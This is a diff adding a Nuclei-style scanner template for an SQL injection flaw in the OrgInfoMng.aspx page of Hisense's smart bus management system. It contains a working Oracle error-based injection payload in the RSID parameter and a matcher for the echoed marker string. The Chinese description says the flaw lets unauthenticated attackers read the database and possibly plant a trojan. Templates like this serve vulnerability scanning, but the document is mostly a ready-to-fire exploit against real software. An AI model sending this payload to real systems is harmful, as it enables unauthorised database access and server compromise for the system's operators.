@@ -1,0 +1,21 @@
+id: hxbus-OrgInfoMng-sqli
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 海信智能公交企业管理系统 OrgInfoMng.aspx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E6%B5%B7%E4%BF%A1/%E6%B5%B7%E4%BF%A1%E6%99%BA%E8%83%BD%E5%85%AC%E4%BA%A4%E4%BC%81%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FOrgInfoMng.aspx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Erp/ErpAdmin/Form/OrgInfoMng.aspx?RSID=1%27+AND+9512%3DCTXSYS.DRITHSX.SN%289512%2C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%289512%3D9512%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%29--+sfjW"
+
+        
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'qvxxq'
